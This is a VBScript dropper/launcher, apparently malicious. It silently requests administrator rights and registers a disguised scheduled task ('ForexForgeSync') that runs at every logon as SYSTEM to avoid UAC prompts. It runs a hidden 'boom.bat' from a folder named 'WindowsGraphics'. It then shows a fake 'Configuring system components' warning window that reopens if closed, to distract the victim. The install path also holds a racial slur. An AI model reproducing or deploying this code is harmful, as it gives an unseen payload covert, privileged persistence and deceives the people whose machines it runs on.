Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' --- CONFIGURATION ---
strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics"
strScript = strPath & "\launcher.vbs"
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION CHECK ---
' We only ask for Admin ONCE during the initial install.
' The /task flag tells the script it's a reboot, so it skips this check.
If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
    ' Request Admin rights hidden (0)
    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: THE NO-UAC TASK CREATION ---
' This only runs if we just got Admin rights (First time setup)
If WScript.Arguments.Named.Exists("elevate") Then
    strTaskName = "ForexForgeSync"
    
    ' KEY FIX: We run as "SYSTEM" (/ru "SYSTEM") to bypass the UAC prompt on reboot.
    ' We use //B to keep the Script Host totally silent.
    strRunCmd = "wscript.exe //B """ & strScript & """ /task"
    strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr """ & strRunCmd & """ /sc onlogon /rl highest /ru ""SYSTEM"" /f"
    
    ' Create the task hidden
    WshShell.Run "cmd.exe /c " & strCreateTask, 0, True
    
    ' Run your initial setup (boom.bat) hidden
    If FSO.FileExists(strPath & "\boom.bat") Then
        WshShell.Run "cmd.exe /c boom.bat", 0, True
    End If
End If

' --- STEP 3: THE "STICKY" DISTRACTION LOOP ---
' This runs on every reboot or after the first install.
' It shows the blue window. If they close it, it re-opens until 30s is up.
startTime = Timer
Do While Timer < startTime + 30
    ' 1 = Visible window, True = Wait for user to close it
    WshShell.Run "cmd.exe /c title System Configuration && color 1f && echo. && echo  Configuring system components... Please wait. && echo  Do not close this window to avoid system errors. && timeout /t 30 /nobreak > nul", 1, True
    
    ' Re-launch if closed too early
    If Timer < startTime + 30 Then 
        WScript.Sleep 500 
    End If
Loop

WScript.Quit
